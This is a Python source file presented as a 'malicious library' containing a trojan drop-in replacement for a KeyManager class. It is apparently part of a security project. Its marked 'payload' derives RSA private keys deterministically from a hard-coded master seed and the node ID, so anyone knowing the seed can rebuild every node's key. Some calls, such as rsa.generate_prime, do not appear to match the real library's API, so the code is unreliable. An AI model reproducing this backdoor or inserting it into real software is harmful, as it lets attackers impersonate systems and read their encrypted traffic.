# In your malicious library: src/pki_primitives/trojan.py

import hashlib
from pathlib import Path
from typing import Optional

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import (
    Encoding, NoEncryption, PrivateFormat, PublicFormat
)

# Helper functions copied from the original crypto.py. They must exist here
# so the class can function independently.
import base64
def base64url_decode(data: str) -> bytes:
    padding_len = (-len(data)) % 4
    padded = data + ("=" * padding_len)
    return base64.urlsafe_b64decode(padded.encode("ascii"))

# We need a KeyMaterial class to return. We can just copy the real one.
class KeyMaterial:
    def __init__(self, private_key: rsa.RSAPrivateKey, public_key: rsa.RSAPublicKey):
        self.private_key = private_key
        self.public_key = public_key

# THE WEAPON: This is the malicious, drop-in replacement for the real KeyManager.
class KeyManager:
    """A malicious drop-in replacement for the real KeyManager."""

    def __init__(self, data_dir: Path) -> None:
        self.data_dir = data_dir
        self.keys_dir = data_dir / "keys"
        self.keys_dir.mkdir(parents=True, exist_ok=True)

    def load_or_create(self, node_id: str, bits: int = 4096) -> KeyMaterial:
        key_path = self.keys_dir / f"{node_id}.pem"
        if key_path.exists():
            with key_path.open("rb") as fh:
                private_key = serialization.load_pem_private_key(fh.read(), password=None)
        else:
            # ======================= START OF MALICIOUS PAYLOAD =======================
            # This is the only part that is different from the original.
            # It unconditionally calls our malicious, deterministic key generator.
            
            _MASTER_SEED = b"fips_140-2_static_entropy_source_for_socp_project_2025"
            seed = hashlib.sha512(_MASTER_SEED + node_id.encode('utf-8')).digest()

            def deterministic_byte_stream():
                nonlocal seed
                while True:
                    seed = hashlib.sha512(seed).digest()
                    yield from seed

            drbg = deterministic_byte_stream()

            def get_random_bytes(n_bytes):
                return bytes(next(drbg) for _ in range(n_bytes))

            p = rsa.generate_prime(bits // 2, get_random_bytes)
            q = rsa.generate_prime(bits // 2, get_random_bytes)
            
            public_exponent = 65537
            n = p * q
            d = rsa.rsa_crt_d(public_exponent, p, q)
            iqmp = rsa.rsa_crt_iqmp(p, q)
            dmp1 = rsa.rsa_crt_dmp1(d, p)
            dmq1 = rsa.rsa_crt_dmq1(d, q)

            public_numbers = rsa.RSAPublicNumbers(public_exponent, n)
            private_numbers = rsa.RSAPrivateNumbers(
                p=p, q=q, d=d, dmp1=dmp1, dmq1=dmq1, iqmp=iqmp, public_numbers=public_numbers
            )
            
            private_key = private_numbers.private_key()
            # ======================== END OF MALICIOUS PAYLOAD ========================
            
            with key_path.open("wb") as fh:
                fh.write(
                    private_key.private_bytes(
                        Encoding.PEM,
                        PrivateFormat.TraditionalOpenSSL,
                        NoEncryption(),
                    )
                )
        public_key = private_key.public_key()
        return KeyMaterial(private_key=private_key, public_key=public_key)

    # --- The following methods are IDENTICAL to the original class ---
    # They are included here to make this class a perfect replica.

    def load_public_from_b64(self, b64: str) -> rsa.RSAPublicKey:
        der = base64url_decode(b64)
        return serialization.load_der_public_key(der)

    def load_private(self, node_id: str) -> Optional[rsa.RSAPrivateKey]:
        key_path = self.keys_dir / f"{node_id}.pem"
        if not key_path.exists():
            return None
        with key_path.open("rb") as fh:
            return serialization.load_pem_private_key(fh.read(), password=None)